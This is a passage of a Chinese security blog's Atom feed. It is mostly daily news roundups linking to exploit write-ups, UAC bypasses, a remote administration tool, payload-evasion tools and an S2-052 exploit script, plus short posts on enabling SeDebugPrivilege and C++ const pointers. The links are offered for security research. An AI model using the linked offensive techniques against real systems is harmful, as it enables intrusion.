<p>以上代码的作用是将运行的程序的权限提升至“SeDebugPrivilege“，拥有该权限以后，当前进程可以访问一些受限的系统资源。<br><br>调整进程权限的步骤如下：<br><br>1.使用OpenProcessToken函数打开当前进程的访问令牌。<br><br>2.使用LookupPrivilegeValue函数取得描述权限的LUID。<br><br>3.使用AdjustTokenPrivilege函数调整访问令牌的权限。<br></p>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul>
<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-privilege" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-privilege</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;还是直接看代码吧，我们直接使用如下的代码进行线程所加载模块的查看。&lt;/p&gt;
&lt;figure class=&quot;highligh
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170913安全动态</title>
    <link href="http://kevien.github.io/2017/09/13/20170913%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/13/20170913安全动态/</id>
    <published>2017-09-13T02:13:04.000Z</published>
    <updated>2017-09-18T09:20:16.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>CVE-2016-10190 FFmpeg Http协议 heap buffer overflow漏洞分析及利用<br><a href="http://www.freebuf.com/column/147585.html" target="_blank" rel="external">http://www.freebuf.com/column/147585.html</a></li>
<li>Catfish—缓存漏洞&amp;&amp;配合CSRF到Getshell<br><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484120&amp;idx=1&amp;sn=aaeec3238102fdf88a22ffb1b9f30a47" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484120&amp;idx=1&amp;sn=aaeec3238102fdf88a22ffb1b9f30a47</a></li>
<li>【干货分享】手把手教你Android Logcat组件安全<br><a href="http://blog.nsfocus.net/android-logcat-security/" target="_blank" rel="external">http://blog.nsfocus.net/android-logcat-security/</a></li>
<li>逆向 OBi200 谷歌语音设备<br><a href="https://randywestergren.com/reverse-engineering-obi200-google-voice-appliance-part-1/" target="_blank" rel="external">https://randywestergren.com/reverse-engineering-obi200-google-voice-appliance-part-1/</a><br><a href="https://randywestergren.com/reverse-engineering-obi200-google-voice-appliance-part-2/" target="_blank" rel="external">https://randywestergren.com/reverse-engineering-obi200-google-voice-appliance-part-2/</a></li>
<li>[ IoTDevice ]  ARM exploitation for IoT - part 2<br><a href="https://quequero.org/2017/09/arm-exploitation-iot-episode-2" target="_blank" rel="external">https://quequero.org/2017/09/arm-exploitation-iot-episode-2</a></li>
<li>windows-event-forwarding - 一款使用 Windows 事件转发来进行事件的检测与响应的工具<br><a href="https://github.com/palantir/windows-event-forwarding" target="_blank" rel="external">https://github.com/palantir/windows-event-forwarding</a><br><a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x68;&#116;&#116;&#112;&#115;&#x3a;&#47;&#x2f;&#109;&#x65;&#100;&#x69;&#x75;&#109;&#46;&#99;&#x6f;&#109;&#x2f;&#x40;&#x70;&#97;&#x6c;&#x61;&#110;&#116;&#105;&#114;&#47;&#119;&#105;&#110;&#x64;&#111;&#x77;&#x73;&#45;&#x65;&#118;&#x65;&#110;&#116;&#x2d;&#x66;&#x6f;&#114;&#119;&#x61;&#x72;&#100;&#105;&#x6e;&#103;&#x2d;&#102;&#x6f;&#114;&#x2d;&#x6e;&#101;&#x74;&#x77;&#x6f;&#x72;&#x6b;&#45;&#100;&#101;&#102;&#101;&#110;&#x73;&#x65;&#45;&#99;&#98;&#x32;&#48;&#x38;&#x64;&#53;&#x66;&#x66;&#x38;&#x36;&#x66;">&#x68;&#116;&#116;&#112;&#115;&#x3a;&#47;&#x2f;&#109;&#x65;&#100;&#x69;&#x75;&#109;&#46;&#99;&#x6f;&#109;&#x2f;&#x40;&#x70;&#97;&#x6c;&#x61;&#110;&#116;&#105;&#114;&#47;&#119;&#105;&#110;&#x64;&#111;&#x77;&#x73;&#45;&#x65;&#118;&#x65;&#110;&#116;&#x2d;&#x66;&#x6f;&#114;&#119;&#x61;&#x72;&#100;&#105;&#x6e;&#103;&#x2d;&#102;&#x6f;&#114;&#x2d;&#x6e;&#101;&#x74;&#x77;&#x6f;&#x72;&#x6b;&#45;&#100;&#101;&#102;&#101;&#110;&#x73;&#x65;&#45;&#99;&#98;&#x32;&#48;&#x38;&#x64;&#53;&#x66;&#x66;&#x38;&#x36;&#x66;</a></li>
<li>ZDI 对补丁日的总结<br><a href="https://www.thezdi.com/blog/2017/9/12/the-september-2017-security-update-review" target="_blank" rel="external">https://www.thezdi.com/blog/2017/9/12/the-september-2017-security-update-review</a></li>
<li>[ Industry News ]  Kromtech 安全中心的人发现 超过 4000 个 ElasticSearch 服务器托管着 PoS 恶意软件(AlinaPOS、 JackPOS)<br><a href="https://www.bleepingcomputer.com/news/security/over-4-000-elasticsearch-servers-found-hosting-pos-malware-files/" target="_blank" rel="external">https://www.bleepingcomputer.com/news/security/over-4-000-elasticsearch-servers-found-hosting-pos-malware-files/</a></li>
<li>Strust2漏洞影响多个Cisco产品<br><a href="http://thehackernews.com/2017/09/apache-struts-flaws-cisco.html" target="_blank" rel="external">http://thehackernews.com/2017/09/apache-struts-flaws-cisco.html</a></li>
<li>CURL会有后门吗？<br><a href="https://daniel.haxx.se/blog/2017/09/12/the-backdoor-threat/" target="_blank" rel="external">https://daniel.haxx.se/blog/2017/09/12/the-backdoor-threat/</a></li>
<li>最近挖src一些小套路总结<br><a href="http://www.cuijianxiong.top/?p=148" target="_blank" rel="external">http://www.cuijianxiong.top/?p=148</a></li>
<li>工控蜜罐Conpot部署和入门指南<br><a href="http://www.freebuf.com/column/147545.html" target="_blank" rel="external">http://www.freebuf.com/column/147545.html</a></li>
<li>fuel UX 前端框架 bootstrap的扩展<br><a href="http://getfuelux.com/" target="_blank" rel="external">http://getfuelux.com/</a></li>
<li>Linux Rootkit系列一：LKM的基础编写及隐藏<br><a href="http://www.freebuf.com/articles/system/54263.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/54263.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;CVE-2016-10190 FFmpeg Http协议 heap buffer overflo
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170912安全动态</title>
    <link href="http://kevien.github.io/2017/09/12/20170912%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/12/20170912安全动态/</id>
    <published>2017-09-12T13:47:54.000Z</published>
    <updated>2017-09-12T16:17:55.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>被黑掉的 WordPress 服务器分析<br><a href="https://www.codemetrix.net/examining-a-hacked-php-server/" target="_blank" rel="external">https://www.codemetrix.net/examining-a-hacked-php-server/</a></li>
<li>通过 DNS 响应欺骗来绕过域控制验证<br><a href="https://labs.detectify.com/2017/09/11/guest-blog-bypassing-domain-control-verification-with-dns-response-spoofing/" target="_blank" rel="external">https://labs.detectify.com/2017/09/11/guest-blog-bypassing-domain-control-verification-with-dns-response-spoofing/</a></li>
<li>使用 Excel.Application 和 DCOM 进行横向渗透<br><a href="https://posts.specterops.io/lateral-movement-using-excel-application-and-dcom-enigma0x3-on-wordpress-com-d11d56e504dc" target="_blank" rel="external">https://posts.specterops.io/lateral-movement-using-excel-application-and-dcom-enigma0x3-on-wordpress-com-d11d56e504dc</a></li>
<li>Siofra - DLL 劫持漏洞扫描器、PE 感染工具<br><a href="https://github.com/falexorr/Siofra" target="_blank" rel="external">https://github.com/falexorr/Siofra</a></li>
<li>基于 Windows Event Forwarding 机制的网络防御措施，之前也推送过一篇微软的《基于 Windows Event Forwarding 的入侵检测》<br><https: medium.com="" @palantir="" windows-event-forwarding-for-network-defense-cb208d5ff86f="" https:="" docs.microsoft.com="" en-us="" windows="" threat-protection="" use-windows-event-forwarding-to-assist-in-instrusion-detection=""></https:></li>
<li>Cuckoo Sandbox 分析框架更新 2.0.4 版本<br><a href="https://cuckoosandbox.org/blog/cuckoo-sandbox-204" target="_blank" rel="external">https://cuckoosandbox.org/blog/cuckoo-sandbox-204</a></li>
<li>The Road To HSTS<br><a href="https://engineeringblog.yelp.com/2017/09/the-road-to-hsts.html" target="_blank" rel="external">https://engineeringblog.yelp.com/2017/09/the-road-to-hsts.html</a></li>
<li>PaX/Grsecurity 新手教程   Grsecurity 是一套增强 Linux 内核安全的内核补丁集，能够轻松应对各种严重安全威胁。<br><a href="https://github.com/hardenedlinux/grsecurity-101-tutorials" target="_blank" rel="external">https://github.com/hardenedlinux/grsecurity-101-tutorials</a></li>
<li>据 Check Point 安全人员说 Windows 10 内置的 Linux Shell 可以被利用来隐藏恶意软件<br><a href="https://motherboard.vice.com/en_us/article/xwwexa/windows-10s-built-in-linux-shell-could-be-abused-to-hide-malware-researchers-say" target="_blank" rel="external">https://motherboard.vice.com/en_us/article/xwwexa/windows-10s-built-in-linux-shell-could-be-abused-to-hide-malware-researchers-say</a></li>
<li>Docker Daemon - Unprotected TCP Socket (Metasploit)<br><a href="https://www.exploit-db.com/exploits/42650/" target="_blank" rel="external">https://www.exploit-db.com/exploits/42650/</a></li>
<li>idb: 用于简化iOS渗透测试及研究的工具<br><a href="https://github.com/dmayer/idb" target="_blank" rel="external">https://github.com/dmayer/idb</a></li>
<li>【技术分享】在细节中捕捉恶魔 ：提升Cuckoo沙箱捕获恶意Office样本行为的能力<br><a href="http://bobao.360.cn/learning/detail/4409.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4409.html</a></li>
<li>[用 Java 写一个 JVM] （一）刚好够运行 HelloWorld<br><a href="https://www.v2ex.com/t/390110#reply16" target="_blank" rel="external">https://www.v2ex.com/t/390110#reply16</a></li>
<li>安息吧 REST API，GraphQL 长存<br><a href="https://segmentfault.com/a/1190000011109222" target="_blank" rel="external">https://segmentfault.com/a/1190000011109222</a></li>
<li>【技术分享】见招拆招：详谈COM接口函数Hook技术<br><a href="http://bobao.360.cn/learning/detail/4405.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4405.html</a></li>
<li>聊聊CVE漏洞编号和正式公开那些事<br><a href="http://blog.nsfocus.net/cve-vulnerability-numbers-officially-disclose/" target="_blank" rel="external">http://blog.nsfocus.net/cve-vulnerability-numbers-officially-disclose/</a></li>
<li>Chrome Unsafe-inline CSP Bypass<br><a href="https://www.math1as.com/index.php/archives/507/" target="_blank" rel="external">https://www.math1as.com/index.php/archives/507/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;被黑掉的 WordPress 服务器分析&lt;br&gt;&lt;a href=&quot;https://www.cod
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170911安全动态</title>
    <link href="http://kevien.github.io/2017/09/11/20170911%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/11/20170911安全动态/</id>
    <published>2017-09-11T10:20:11.000Z</published>
    <updated>2017-09-11T15:51:27.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol，研究员公开了 Dlink 850L 路由器的多个 0Day<br><a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html" target="_blank" rel="external">https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html</a></li>
<li>逆向 Aura 智能闹钟<br><a href="https://courk.fr/index.php/2017/09/10/reverse-engineering-exploitation-connected-clock/" target="_blank" rel="external">https://courk.fr/index.php/2017/09/10/reverse-engineering-exploitation-connected-clock/</a></li>
<li>IOT 安全 – Part 2: IOT 攻击面<br><a href="http://payatu.com/iot-security-part-2-101-iot-attack-surface/" target="_blank" rel="external">http://payatu.com/iot-security-part-2-101-iot-attack-surface/</a></li>
<li>struts-pwn_CVE-2017-9805: S2-052 漏洞利用脚本<br><a href="https://github.com/mazen160/struts-pwn_CVE-2017-9805" target="_blank" rel="external">https://github.com/mazen160/struts-pwn_CVE-2017-9805</a></li>
<li>GreatSCT - 一款应用白名单绕过工具<br><a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="external">https://github.com/GreatSCT/GreatSCT</a></li>
<li>古老的 MS08-067 漏洞中 MSRPC NetPathCanonicalize 路径格式化函数在处理 “..” 时的栈破坏漏洞分析<br><a href="http://www.tiagoalexandre.com/security/exploit%20development/2017/09/08/MS08-067" target="_blank" rel="external">http://www.tiagoalexandre.com/security/exploit%20development/2017/09/08/MS08-067</a></li>
<li>利用 ADS（Alternate Data Streams）Bypass UAC<br><a href="https://www.redcanary.com/blog/using-alternate-data-streams-bypass-user-account-controls/" target="_blank" rel="external">https://www.redcanary.com/blog/using-alternate-data-streams-bypass-user-account-controls/</a></li>
<li>维基解密是如何遭到黑客攻击的<br><a href="https://zhuanlan.zhihu.com/p/29162387" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/29162387</a></li>
<li>Web 安全方向上的资料整理<br><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">https://github.com/CHYbeta/Web-Security-Learning</a></li>
<li>虐待二进制执行分析框架 Triton，挑战它的控制流图还原功能<br><a href="https://blog.quarkslab.com/mistreating-triton.html" target="_blank" rel="external">https://blog.quarkslab.com/mistreating-triton.html</a></li>
<li>软件供应链来源攻击分析报告<br><a href="https://mp.weixin.qq.com/s/I6cJ7xgT5mTESL0TXa1DBw" target="_blank" rel="external">https://mp.weixin.qq.com/s/I6cJ7xgT5mTESL0TXa1DBw</a></li>
<li>西方红玫瑰和辣条先生黑产组织深度分析报告<br><a href="http://www.freebuf.com/articles/paper/145777.html" target="_blank" rel="external">http://www.freebuf.com/articles/paper/145777.html</a></li>
<li>iOS也不安全？高危漏洞威胁近半果粉<br><a href="https://mp.weixin.qq.com/s/bwPwySM3ZjqLWyNN99a5ow" target="_blank" rel="external">https://mp.weixin.qq.com/s/bwPwySM3ZjqLWyNN99a5ow</a></li>
<li>如何将Pastebin上的信息应用于安全分析和威胁情报领域<br><a href="https://techanarchy.net/2017/09/hunting-pastebin-with-pastehunter/" target="_blank" rel="external">https://techanarchy.net/2017/09/hunting-pastebin-with-pastehunter/</a></li>
<li>DEDECMS 会员中心代码投稿缺陷可getshell<br><a href="https://mp.weixin.qq.com/s/_t6h7PosyVGsSAChqDQRfg" target="_blank" rel="external">https://mp.weixin.qq.com/s/_t6h7PosyVGsSAChqDQRfg</a></li>
<li>Windows内核驱动漏洞利用代码开发简介（part-1） - 环境设置  Windows内核漏洞利用代码开发开发简介（part2）：如何利用堆缓冲区溢出漏洞到系统shell<br><a href="https://glennmcgui.re/introduction-to-windows-kernel-exploitation-pt-1/" target="_blank" rel="external">https://glennmcgui.re/introduction-to-windows-kernel-exploitation-pt-1/</a><br><https: glennmcgui.re="" introduction-to-windows-kernel-driver-exploitation-pt-2=""></https:></li>
<li>苹果Touch ID安全性浅谈<br><a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#104;&#116;&#116;&#112;&#115;&#x3a;&#x2f;&#x2f;&#x6d;&#x65;&#x64;&#x69;&#x75;&#x6d;&#46;&#x63;&#111;&#109;&#47;&#64;&#x66;&#x73;&#x74;&#105;&#101;&#x68;&#108;&#x65;&#x2f;&#100;&#x65;&#109;&#x79;&#115;&#116;&#105;&#102;&#x79;&#105;&#x6e;&#103;&#45;&#x61;&#x70;&#x70;&#108;&#101;&#x73;&#45;&#116;&#x6f;&#117;&#99;&#x68;&#x2d;&#x69;&#100;&#45;&#x34;&#56;&#x38;&#x33;&#100;&#53;&#49;&#x32;&#x31;&#98;&#x37;&#x37;">&#104;&#116;&#116;&#112;&#115;&#x3a;&#x2f;&#x2f;&#x6d;&#x65;&#x64;&#x69;&#x75;&#x6d;&#46;&#x63;&#111;&#109;&#47;&#64;&#x66;&#x73;&#x74;&#105;&#101;&#x68;&#108;&#x65;&#x2f;&#100;&#x65;&#109;&#x79;&#115;&#116;&#105;&#102;&#x79;&#105;&#x6e;&#103;&#45;&#x61;&#x70;&#x70;&#108;&#101;&#x73;&#45;&#116;&#x6f;&#117;&#99;&#x68;&#x2d;&#x69;&#100;&#45;&#x34;&#56;&#x38;&#x33;&#100;&#53;&#49;&#x32;&#x31;&#98;&#x37;&#x37;</a></li>
<li>Vulners Python API wrapper<br><a href="https://github.com/vulnersCom/api" target="_blank" rel="external">https://github.com/vulnersCom/api</a></li>
<li>手工逆 Chrome 扩展后门的一些思路<br><a href="https://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=2651081304&amp;idx=1&amp;sn=8f63e1cfd3261763ff8d982c045d0c51" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=2651081304&amp;idx=1&amp;sn=8f63e1cfd3261763ff8d982c045d0c51</a></li>
<li>【技术分享】how2heap总结-上  堆溢出<br><a href="http://bobao.360.cn/learning/detail/4386.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4386.html</a></li>
<li>python的多进程编程<br><a href="https://www.keakon.net/2017/09/09/Python%E7%9A%84%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E7%A8%8B" target="_blank" rel="external">https://www.keakon.net/2017/09/09/Python%E7%9A%84%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E7%A8%8B</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">深入的讲解了一些原理性的东西</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Pwning the Dlink 850L routers and abusing the My
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170908安全动态</title>
    <link href="http://kevien.github.io/2017/09/08/20170908%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/08/20170908安全动态/</id>
    <published>2017-09-08T02:40:59.000Z</published>
    <updated>2017-09-10T09:35:26.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>Django debug page XSS漏洞（CVE-2017-12794）分析<br><a href="https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html</a></li>
<li>Python 反序列化漏洞利用<br><a href="https://crowdshield.com/blog.php?name=exploiting-python-deserialization-vulnerabilities" target="_blank" rel="external">https://crowdshield.com/blog.php?name=exploiting-python-deserialization-vulnerabilities</a></li>
<li>攻击嵌入式设备与网络协议，来自 zer0con 大会<br><a href="https://pierrekim.github.io/advisories/z0-Owning_embedded_devices_and_network_protocols-redacted.pdf" target="_blank" rel="external">https://pierrekim.github.io/advisories/z0-Owning_embedded_devices_and_network_protocols-redacted.pdf</a></li>
<li>Source for macOS 10.12.5 and 10.12.6  macOS源码<br><a href="https://opensource.apple.com/release/macos-10125.html" target="_blank" rel="external">https://opensource.apple.com/release/macos-10125.html</a><br><a href="https://opensource.apple.com/release/macos-10126.html" target="_blank" rel="external">https://opensource.apple.com/release/macos-10126.html</a></li>
<li>SymGDB - 一款基于 Triton 的 GDB 符号执行插件<br><a href="https://github.com/SQLab/symgdbhttps://hitcon.org/2017/CMT/slide-files/d2_s1_r0.pdf" target="_blank" rel="external">https://github.com/SQLab/symgdbhttps://hitcon.org/2017/CMT/slide-files/d2_s1_r0.pdf</a></li>
<li>DKMC - 将 Payload 放到图片中实现免杀效果的工具<br><a href="https://github.com/Mr-Un1k0d3r/DKMC" target="_blank" rel="external">https://github.com/Mr-Un1k0d3r/DKMC</a></li>
<li>Windows 内核驱动漏洞利用系列 Part 1<br><a href="https://glennmcgui.re/introduction-to-windows-kernel-exploitation-pt-1/" target="_blank" rel="external">https://glennmcgui.re/introduction-to-windows-kernel-exploitation-pt-1/</a></li>
<li>Linux进程间代码注入<br><a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="external">https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html</a></li>
<li>PiFinger：检测当前网络中是否存在Wifi- Pineapple，并评估当前wifi网络的安全性<br><a href="https://github.com/besimaltnok/PiFinger" target="_blank" rel="external">https://github.com/besimaltnok/PiFinger</a></li>
<li>Hunting Pastebin with PasteHunter<br><a href="https://techanarchy.net/2017/09/hunting-pastebin-with-pastehunter/" target="_blank" rel="external">https://techanarchy.net/2017/09/hunting-pastebin-with-pastehunter/</a></li>
<li>看我如何破解Dlink 850路由器然后滥用MyDlink Cloud协议<br><a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html" target="_blank" rel="external">https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html</a></li>
<li>Abusing JavaScript frameworks to bypass XSS mitigations<br><a href="http://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html" target="_blank" rel="external">http://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html</a></li>
<li>Using Alternate Data Streams to Bypass User Account Controls<br><https: www.redcanary.com="" blog="" using-alternate-data-streams-bypass-user-account-controls=""><br><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-WScriptBypassUAC.ps1" target="_blank" rel="external">https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-WScriptBypassUAC.ps1</a></https:></li>
<li>渗透3389端口<br><a href="http://www.hackingarticles.in/penetration-testing-remote-desktop-port-3389/" target="_blank" rel="external">http://www.hackingarticles.in/penetration-testing-remote-desktop-port-3389/</a></li>
<li>安全研究人员披露D-Link路由器漏洞<br><a href="http://www.securityweek.com/unpatched-d-link-router-vulnerabilities-disclosed" target="_blank" rel="external">http://www.securityweek.com/unpatched-d-link-router-vulnerabilities-disclosed</a></li>
<li>机器学习对抗资源集合<br><a href="https://github.com/yenchenlin/awesome-adversarial-machine-learning" target="_blank" rel="external">https://github.com/yenchenlin/awesome-adversarial-machine-learning</a></li>
<li>开源可定制远程管理工具（RAT）<br><a href="https://github.com/SySS-Research/outis" target="_blank" rel="external">https://github.com/SySS-Research/outis</a></li>
<li>XML的花式利用<br><a href="https://blog.pragmatists.com/xml-be-cautious-69a981fdc56a?gi=38c5799a5aa4" target="_blank" rel="external">https://blog.pragmatists.com/xml-be-cautious-69a981fdc56a?gi=38c5799a5aa4</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>C/C++ 开源库及示例代码<br><a href="https://github.com/programthink/opensource/blob/master/libs/cpp.wiki" target="_blank" rel="external">https://github.com/programthink/opensource/blob/master/libs/cpp.wiki</a></li>
<li>vc samples<br><a href="https://github.com/Microsoft/VCSamples" target="_blank" rel="external">https://github.com/Microsoft/VCSamples</a></li>
<li>Automated malcode analysis system<br><a href="https://github.com/dzzie/SysAnalyzer" target="_blank" rel="external">https://github.com/dzzie/SysAnalyzer</a></li>
<li>一个基于命令行的翻译工具<br><a href="https://github.com/soimort/translate-shell" target="_blank" rel="external">https://github.com/soimort/translate-shell</a><br><img src="/2017/09/08/20170908安全动态/trans.png" alt=""></li>
<li>python生成验证码<br><a href="https://lizonghang.github.io/2016/07/30/Python%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%A0%81/" target="_blank" rel="external">https://lizonghang.github.io/2016/07/30/Python%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%A0%81/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Django debug page XSS漏洞（CVE-2017-12794）分析&lt;br&gt;&lt;a 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>指针参数传递与数据安全</title>
    <link href="http://kevien.github.io/2017/09/07/%E6%8C%87%E9%92%88%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/"/>
    <id>http://kevien.github.io/2017/09/07/指针参数传递与数据安全/</id>
    <published>2017-09-07T07:27:19.000Z</published>
    <updated>2017-09-13T11:38:53.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="知识扫盲"><a href="#知识扫盲" class="headerlink" title="知识扫盲"></a>知识扫盲</h4><ul>
<li>理解常值变量和符号常量的区别<br><br>在定义时用const修饰的普通变量称为常值变量.例如：<br><br>const int MaxLint = 1000;<br><br>const float Pi = 3.1415926;<br><br>指针做函数参数时，参数的传递效率非常高，通过指针可以对指针所指内存进行读/写。<br>在实际的编程中，若函数的形参为指针，则该函数只是读取指针所指内存的数据，则应将该指针用const修饰，以限制在函数体内对指针所指内存的修改。这样，即兼顾了指针参数的高效传递，又兼顾了指针所指数据的安全。如果函数的形参为引用，且该函数只是读取引用所关联的变量，则也应该采用相同的措施。<h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include &quot;iostream&quot;</div><div class="line">using namespace std;</div><div class="line">//void sp_to_dash(const char *s)</div><div class="line">//&#123;</div><div class="line">//	while(*s)</div><div class="line">//	&#123;</div><div class="line">//		if(*s == &apos; &apos;) *s = &apos;_&apos;;//添加const修饰，这里在修改指针所指变量的值时候，编译器会报错</div><div class="line">//		cout&lt;&lt; *s++;</div><div class="line">//	&#125;</div><div class="line">//&#125;</div><div class="line"></div><div class="line">void sp_to_dash(const char *s)</div><div class="line">&#123;</div><div class="line">	while(*s)</div><div class="line">	&#123;</div><div class="line">		if(*s == &apos; &apos;) cout&lt;&lt;&apos;_&apos;;</div><div class="line">		else cout&lt;&lt;*s;</div><div class="line">		s++;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	sp_to_dash(&quot;hello !&quot;);</div><div class="line">	cout&lt;&lt;endl;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;知识扫盲&quot;&gt;&lt;a href=&quot;#知识扫盲&quot; class=&quot;headerlink&quot; title=&quot;知识扫盲&quot;&gt;&lt;/a&gt;知识扫盲&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;理解常值变量和符号常量的区别&lt;br&gt;&lt;br&gt;在定义时用const修饰的普通变量称为常值变量.例如：&lt;br&gt;&lt;br
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170907安全动态</title>
    <link href="http://kevien.github.io/2017/09/07/20170907%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/07/20170907安全动态/</id>
    <published>2017-09-07T02:21:37.000Z</published>
    <updated>2017-09-07T17:12:05.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>3gstudent/Pentest-Tips: A collection of pentest tips<br><a href="https://github.com/3gstudent/Pentest-and-Development-Tips" target="_blank" rel="external">https://github.com/3gstudent/Pentest-and-Development-Tips</a></li>
<li>数字签名攻击报告：正在摧毁软件身份“信用体系”的安全危机<br><a href="http://www.freebuf.com/articles/network/146274.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/146274.html</a></li>
